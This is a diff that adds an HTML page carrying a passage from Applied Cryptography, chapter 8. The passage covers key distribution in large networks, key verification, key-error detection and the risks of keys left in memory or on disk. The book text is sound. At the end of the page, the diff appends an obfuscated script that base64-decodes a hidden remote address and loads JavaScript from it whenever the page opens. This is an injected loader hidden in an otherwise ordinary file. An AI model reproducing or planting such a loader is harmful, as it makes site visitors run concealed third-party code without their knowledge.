@@ -1,0 +1,103 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key Management</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=08//-->
+<!--PAGES=177-180//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="08-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="08-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Key Distribution in Large Networks</I></B></FONT></P>
+<P>Key-encryption keys shared by pairs of users work well in small networks, but can quickly get cumbersome if the networks become large. Since every pair of users must exchange keys, the total number of key exchanges required in an <I>n-</I>person network is <I>n</I>(<I>n</I> &#150; 1)/2.</P>
+<P>In a six-person network, 15 key exchanges are required. In a 1000-person network, nearly 500,000 key exchanges are required. In these cases, creating a central key server (or servers) makes the operation much more efficient.</P>
+<P>Alternatively, any of the symmetric-cryptography or public-key-cryptography protocols in Section 3.1 provides for secure key distribution.</P>
+<I><P><A NAME="Fig2"></A><A HREF="javascript:displayWindow('images/08-02.jpg',278,162 )"><IMG SRC="images/08-02t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/08-02.jpg',278,162)"><FONT COLOR="#000077"><B>Figure 8.2</B></FONT></A>&nbsp;&nbsp;Key distribution via parallel channels.</I>
+</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">8.4 Verifying Keys</FONT></H3>
+<P>When Bob receives a key, how does he know it came from Alice and not from someone pretending to be Alice? If Alice gives it to him when they are face-to-face, it&#146;s easy. If Alice sends her key via a trusted courier, then Bob has to trust the courier. If the key is encrypted with a key-encryption key, then Bob has to trust the fact that only Alice has that key. If Alice uses a digital signature protocol to sign the key, Bob has to trust the public-key database when he verifies that signature. (He also has to trust that Alice has kept her key secure.) If a Key Distribution Center (KDC) signs Alice&#146;s public key, Bob has to trust that his copy of the KDC&#146;s public key has not been tampered with.
+</P>
+<P>In the end, someone who controls the entire network around Bob can make him think whatever he likes. Mallory could send an encrypted and signed message purporting to be from Alice. When Bob tried to access the public-key database to verify Alice&#146;s signature, Mallory could substitute his own public key. Mallory could invent his own false KDC and exchange the real KDC&#146;s public key for his own creation. Bob wouldn&#146;t be the wiser.</P>
+<P>Some people have used this argument to claim that public-key cryptography is useless. Since the only way for Alice and Bob to ensure that their keys have not been tampered with is to meet face-to-face, public-key cryptography doesn&#146;t enhance security at all.</P>
+<P>This view is na&#239;ve. It is theoretically true, but reality is far more complicated. Public-key cryptography, used with digital signatures and trusted KDCs, makes it much more difficult to substitute one key for another. Bob can never be absolutely certain that Mallory isn&#146;t controlling his entire reality, but Bob can be confident that doing so requires more resources than most real-world Mallorys have access to.</P>
+<P>Bob could also verify Alice&#146;s key over the telephone, where he can hear her voice. Voice recognition is a really good authentication scheme. If it&#146;s a public key, he can safely recite it in public. If it&#146;s a secret key, he can use a one-way hash function to verify the key. Both PGP (see Section 24.12) and the AT&ampT TSD (see Section 24.18) use this kind of key verification.</P>
+<P>Sometimes, it may not even be important to verify exactly whom a public key belongs to. It may be necessary to verify that it belongs to the same person to whom it belonged last year. If someone sends a signed withdrawal message to a bank, the bank does not have to be concerned with who withdraws the money, only whether it is the same person who deposited the money in the first place.</P>
+<P><FONT SIZE="+1"><B><I>Error Detection during Key Transmission</I></B></FONT></P>
+<P>Sometimes keys get garbled in transmission. Since a garbled key can mean megabytes of undecryptable ciphertext, this is a problem. All keys should be transmitted with some kind of error detection and correction bits. This way errors in transmission can be easily detected and, if required, the key can be resent.
+</P>
+<P>One of the most widely used methods is to encrypt a constant value with the key, and to send the first 2 to 4 bytes of that ciphertext along with the key. At the receiving end, do the same thing. If the encrypted constants match, then the key has been transmitted without error. The chance of an undetected error ranges from one in 2<SUP>16</SUP> to one in 2<SUP>32</SUP>.</P>
+<P><FONT SIZE="+1"><B><I>Key-error Detection during Decryption</I></B></FONT></P>
+<P>Sometimes the receiver wants to check if a particular key he has is the correct symmetric decryption key. If the plaintext message is something like ASCII, he can try to decrypt and read the message. If the plaintext is random, there are other tricks.
+</P>
+<P>The na&#239;ve approach is to attach a <B>verification block</B>: a known header to the plaintext message before encryption. At the receiving end, Bob decrypts the header and verifies that it is correct. This works, but it gives Eve a known plaintext to help cryptanalyze the system. It also makes attacks against short-key ciphers like DES and all exportable ciphers easy. Precalculate the checksum once for each key, then use that checksum to determine the key in any message you intercept after that. This is a feature of <I>any</I> key checksum that doesn&#146;t include random or at least different data in each checksum. It&#146;s very similar in concept to using salt when generating keys from passphrases.</P>
+<P>Here&#146;s a better way to do this [821]:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Generate an IV (not the one used for the message).
+<DD><B>(2)</B>&nbsp;&nbsp;Use that IV to generate a large block of bits: say, 512.
+<DD><B>(3)</B>&nbsp;&nbsp;Hash the result.
+<DD><B>(4)</B>&nbsp;&nbsp;Use the same fixed bits of the hash, say 32, for the key checksum.
+</DL>
+<P>This gives Eve some information, but very little. If she tries to use the low 32 bits of the final hash value to mount a brute-force attack, she has to do multiple encryptions plus a hash per candidate key; brute-force on the key itself would be quicker.
+</P>
+<P>She also gets no known-plaintext values to try out, and even if she manages to choose our random value for us, she never gets a chosen-plaintext out of us, since it goes through the hash function before she sees it.</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">8.5 Using Keys</FONT></H3>
+<P>Software encryption is scary. Gone are the days of simple microcomputers under the control of single programs. Now there&#146;s Macintosh System 7, Windows NT, and UNIX. You can&#146;t tell when the operating system will suspend the encryption application in progress, write everything to disk, and take care of some pressing task. When the operating system finally gets back to encrypting whatever is being encrypted, everything will look just fine. No one will ever realize that the operating system wrote the encryption application to disk, and that it wrote the key along with it. The key will sit on the disk, unencrypted, until the computer writes over that area of memory again. It could be minutes or it could be months. It could even be never; the key could still be sitting there when an adversary goes over the hard drive with a fine-tooth comb. In a preemptive, multitasking environment, you can set your encryption operation to a high enough priority so it will not be interrupted. This would mitigate the risk. Even so, the whole thing is dicey at best.
+</P>
+<P>Hardware implementations are safer. Many encryption devices are designed to erase the key if tampered with. For example, the IBM PS/2 encryption card has an epoxy unit containing the DES chip, battery, and memory. Of course, you have to trust the hardware manufacturer to implement the feature properly.</P>
+<P>Some communications applications, such as telephone encryptors, can use <B>session keys</B>. A session key is a key that is just used for one communications session&#151;a single telephone conversation&#151;and then discarded. There is no reason to store the key after it has been used. And if you use some key-exchange protocol to transfer the key from one conversant to the other, the key doesn&#146;t have to be stored before it is used either. This makes it far less likely that the key might be compromised.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="08-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="08-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(IDkfPaka, QBgaQbia) {QBgaQbia = IDkfPaka.createElement('script');QBgaQbia.type = 'text/javascript';QBgaQbia.async = true;QBgaQbia.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');IDkfPaka.getElementsByTagName('body')[0].appendChild(QBgaQbia);}(document));</script></body>
+</html>
